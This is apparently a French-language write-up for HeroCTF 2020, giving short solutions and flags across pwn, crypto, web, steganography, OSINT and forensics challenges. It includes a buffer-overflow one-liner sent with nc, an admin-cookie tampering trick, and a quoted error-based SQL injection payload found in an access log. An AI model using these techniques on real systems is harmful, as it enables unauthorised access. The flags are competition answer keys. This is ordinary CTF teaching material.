# HeroCTF 2020

## Pwn

### FunnyCat

L'objectif était de lire un fichier nommé "-". La solution était d'exécuter la commande : `cat <-`.

Flag : `Hero{v3ry_s1mpl3_sh3ll_trick}`

### Forceur

Un classique bufferoverflow. Tout d'abord on analyse le code avec Ghidra pour avoir la longueur de la chaine de caractère puis on exécute la commande : `python -c 'print("A" * 5005)' | nc challs.heroctf.fr 7000`.

Flag : `Hero{W0w_wh4t_4_n1c3_j0b!!}`

## Crypto

### FunnyBase

Le texte original `746869735F626173655F69735F66756E6E795F3136
` était simplement en base16. Le [décoder](https://simplycalc.com/base16-decode.php) et obtenir le flag.

Flag : `Hero{this_base_is_funny_16}`

## Web

### PasMalin

Mot de passe indiqué dans le HTML.
- Identifiant : admin
- Mot de passe : football123

Flag : `Hero{b4ck_t0_th3_s0urc3_1084}`

### FreeAccess

La vérification du statut de l'administrateur se fait par un cookie "admin" avec la valeur 0. Changer cette valeur à 1 pour accéder à l'espace administrateur.

Flag : `Hero{1_l0v3_c00k1ies_123}``

## Steganography

### Vergrootglas

Le flag est situé en bas à droite de l'image.

Flag : `Hero{W3ll_Pl4y3d_12}`

## OSINT

### Rules

Regarder la description du channel #regles sur le Discord du CTF.

Flag : `Hero{sup3r_rul3s}`

### Writeups

Lire les [writeups de l'année précédente](https://github.com/0xSoEasY/HeroCTF).

Flag : `HeroCTF{W3_w1ll_b3_b4ck}`

## Forensics

### What the log 1/3

Regarder le fichier access.log. Utilisation du logiciel [http Logs Viewer](https://www.apacheviewer.com/) pour simplifier la recherche.

Flag : `Hero{2.51.21.32:EvilSoEasy}`

### What the log 2/3

Regarder le fichier access.log en testant la recherche sur des types de fichiers connus tels que le PDF.

Flag : `Hero{partiel_php.pdf}`

### What the log 3/3

Rechercher parmi les requêtes POST du fichier access.log. On trouve l'accès à une URL :

```sh
"http://localhost:4444/inscription.php?id=' OR (select 1 from(select count(*),concat((select (select (SELECT concat(0x4d,0x79,0x53,0x75,0x70,0x33,0x72,0x53,0x33,0x63,0x72,0x33,0x74,0x50,0x34,0x73,0x73,0x77,0x30,0x72,0x64,cast(r00t.username as char)) FROM `Boris`.r00t LIMIT 0,1) ) from information_schema.tables ; OR '1' =1; --&pseudo=l&mail=l@l.fr"
```

Convertir HEX vers ASCII avec [CyberChef](https://gchq.github.io/CyberChef/).

Flag : `MySup3rS3cr3tP4ssw0rd`